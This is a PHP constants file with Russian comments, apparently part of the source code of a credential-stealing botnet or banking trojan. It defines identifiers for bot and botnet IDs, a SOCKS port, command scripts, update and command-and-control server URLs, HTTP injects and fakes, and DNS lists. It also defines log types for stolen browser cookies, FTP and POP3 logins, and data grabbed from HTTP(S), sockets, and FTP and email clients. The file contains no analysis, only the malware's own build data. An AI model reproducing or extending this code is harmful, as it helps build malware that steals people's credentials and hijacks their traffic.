<?php
/*
  Список макросов общих для C и PHP.
  Файл подключаеся в make.php
  
  Примечание: Т.к. PHP использует только тип int(знаковый), то во всех макросов нужно использовать
              знак минус для высоких значений.
*/

//ID для BinStorage элементов.
$_COMMON_DEFINE['SBCID_BOT_ID']                = '10001'; //ID бота.
$_COMMON_DEFINE['SBCID_BOTNET']                = '10002'; //Ботнет.
$_COMMON_DEFINE['SBCID_BOT_VERSION']           = '10003'; //Версия.
$_COMMON_DEFINE['SBCID_NET_LATENCY']           = '10005'; //Лаг сети.
$_COMMON_DEFINE['SBCID_TCPPORT_S1']            = '10006'; //Порт для Socks.
$_COMMON_DEFINE['SBCID_PATH_SOURCE']           = '10007'; //Исходный путь файла.
$_COMMON_DEFINE['SBCID_PATH_DEST']             = '10008'; //Конечный путь файла.
$_COMMON_DEFINE['SBCID_TIME_SYSTEM']           = '10009'; //Системное время.
$_COMMON_DEFINE['SBCID_TIME_TICK']             = '10010'; //GetTickCount.
$_COMMON_DEFINE['SBCID_TIME_LOCALBIAS']        = '10011'; //GMT оффсет.
$_COMMON_DEFINE['SBCID_OS_INFO']               = '10012'; //Версия OS DWORD[5](major, minor, build_number, sp, (wSuiteMask + wProductType)).
$_COMMON_DEFINE['SBCID_LANGUAGE_ID']           = '10013'; //ID языка.
$_COMMON_DEFINE['SBCID_PROCESS_NAME']          = '10014'; //Путь процесса.
$_COMMON_DEFINE['SBCID_PROCESS_USER']          = '10015'; //Имя пользователя для процесса.
$_COMMON_DEFINE['SBCID_IPV4_ADDRESSES']        = '10016'; //Список IPv4.
$_COMMON_DEFINE['SBCID_IPV6_ADDRESSES']        = '10017'; //Список IPv6.
$_COMMON_DEFINE['SBCID_BOTLOG_TYPE']           = '10018'; //Тип лога.
$_COMMON_DEFINE['SBCID_BOTLOG']                = '10019'; //Лог.

$_COMMON_DEFINE['SBCID_SCRIPT_ID']             = '11000'; //ID выполненого скрипта. MD5 хэш.
$_COMMON_DEFINE['SBCID_SCRIPT_STATUS']         = '11001'; //Статус выполненого скрипта.
$_COMMON_DEFINE['SBCID_SCRIPT_RESULT']         = '11002'; //Текствый отчет об исполнении команды. Не более 0xFFFF символов.

$_COMMON_DEFINE['CFGID_LAST_VERSION']          = '20001'; //Последняя доступная версия бота.
$_COMMON_DEFINE['CFGID_LAST_VERSION_URL']      = '20002'; //URL, где можно скачать последнию версию бота.
$_COMMON_DEFINE['CFGID_URL_SERVER_0']          = '20003'; //URL серверного скрипта.
$_COMMON_DEFINE['CFGID_URL_ADV_SERVERS']       = '20004'; //Мульти-строка резервных адресов серверного скрипта.
$_COMMON_DEFINE['CFGID_HTTP_FILTER']           = '20005'; //Мульти-строка для фильтрации HTTP.
$_COMMON_DEFINE['CFGID_HTTP_POSTDATA_FILTER']  = '20006'; //Мульти-строка для фильтрации пост-данных.
$_COMMON_DEFINE['CFGID_HTTP_INJECTS_LIST']     = '20007'; //Список HTTP-инжектов/фейков.
$_COMMON_DEFINE['CFGID_DNS_LIST']              = '20008'; //Список DNS.

//Значения для SBCID_BOTLOG_TYPE.
$_COMMON_DEFINE['BLT_UNKNOWN']                 = '0';   //Неивестный отчет.

$_COMMON_DEFINE['BLT_COOKIES']                 = '1';   //Кукисы браузеров.
$_COMMON_DEFINE['BLT_FILE']                    = '2';   //Файл.

$_COMMON_DEFINE['BLT_HTTP_REQUEST']            = '11';  //HTTP-запрос.
$_COMMON_DEFINE['BLT_HTTPS_REQUEST']           = '12';  //HTTPS-запрос.

$_COMMON_DEFINE['BLT_LOGIN_FTP']               = '100'; //Логин FTP.
$_COMMON_DEFINE['BLT_LOGIN_POP3']              = '101'; //Логин POP3.

$_COMMON_DEFINE['BLT_GRABBED_UI']              = '200'; //Данные полученые из User Interface.
$_COMMON_DEFINE['BLT_GRABBED_HTTP']            = '201'; //Данные полученые из HTTP(s).
$_COMMON_DEFINE['BLT_GRABBED_WSOCKET']         = '202'; //Данные полученые из WinSocket.
$_COMMON_DEFINE['BLT_GRABBED_FTPSOFTWARE']     = '203'; //Данные полученые из FTP-клиентов.
$_COMMON_DEFINE['BLT_GRABBED_EMAILSOFTWARE']   = '204'; //Данные полученые из E-mail-клиентов.
$_COMMON_DEFINE['BLT_GRABBED_OTHER']           = '299'; //Данные полученые из других источников.

//Лимиты.
$_COMMON_DEFINE['BOT_ID_MAX_CHARS']            = '100'; //Максимальный размер имени бота
$_COMMON_DEFINE['BOTNET_MAX_CHARS']            = '20';  //Максимальный размер имени ботнета
?>